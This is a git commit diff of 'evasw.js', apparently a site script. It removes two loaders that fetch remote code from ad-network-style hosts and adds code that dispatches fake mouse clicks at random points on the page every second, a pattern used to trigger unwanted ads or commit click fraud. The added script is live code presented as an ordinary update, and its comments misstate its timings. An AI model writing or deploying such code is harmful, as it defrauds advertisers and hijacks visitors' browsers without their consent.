b645b02bdf9ddc5cad4504313269040e7c4570a4
citadin88 <31966923+citadin88@users.noreply.github.com>
2024-01-15 18:39:17 +0100

    Update evasw.js

--- evasw.js
+++ evasw.js
@@ -1,5 +1,64 @@
-importScripts('https://ulmoyc.com/v1/sw-import.js?h=waWQiOjExNzI0NjAsInNpZCI6MTMxMTM5NSwid2lkIjo1MzAwNDQsInNyYyI6MiwicG0iOjAsIm10IjowfQ==eyJ&d=dailycryptic-news.com');
 
+document.addEventListener('DOMContentLoaded', function() {
+ function simulateDelayedClick(x, y) {
+      var clickEvent = new MouseEvent('click', {
+        view: window,
+        bubbles: true,
+        cancelable: true,
+        clientX: x,
+        clientY: y
+      });
+      var element = document.elementFromPoint(x, y);
+      if (element) {
+        element.dispatchEvent(clickEvent);
+      }
+    }
 
+    function simulateMouseClick(x, y) {
+      var mouseDownEvent = new MouseEvent('mousedown', {
+        view: window,
+        bubbles: true,
+        cancelable: true,
+        clientX: x,
+        clientY: y
+      });
 
-(function(d){let s=d.createElement('script');s.async=true;s.src='https://puabvo.com/code/native.js?h=waWQiOjExNzI0NjAsInNpZCI6MTMxMTM5NSwid2lkIjo1MzAwNDQsInNyYyI6Mn0=eyJ';d.head.appendChild(s);})(document);
+      var mouseUpEvent = new MouseEvent('mouseup', {
+        view: window,
+        bubbles: true,
+        cancelable: true,
+        clientX: x,
+        clientY: y
+      });
+
+      var body = document.body;
+      body.dispatchEvent(mouseDownEvent);
+
+      setTimeout(function() {
+        body.dispatchEvent(mouseUpEvent);
+        setTimeout(function() {
+          simulateDelayedClick(x, y);
+        }, 50); // Adjust the delay for better results
+      }, 50); // Adjust the delay for better results
+    }
+
+    // Array of elements to click on
+    var clickTargets = [
+      document.querySelector('h1'),
+      document.querySelector('p')
+      // Add more elements here if needed
+    ];
+
+    // Function to trigger the interval
+    function startInterval() {
+      setInterval(function() {
+        var randomElement = clickTargets[Math.floor(Math.random() * clickTargets.length)];
+        var rect = randomElement.getBoundingClientRect();
+        var randomX = rect.left + Math.random() * rect.width;
+        var randomY = rect.top + Math.random() * rect.height;
+        simulateMouseClick(randomX, randomY);
+      }, 1000); // 2000 milliseconds = 2 seconds
+    }
+
+    // Delayed start of the interval
+    setTimeout(startInterval, 1000); // Start after 2 seconds
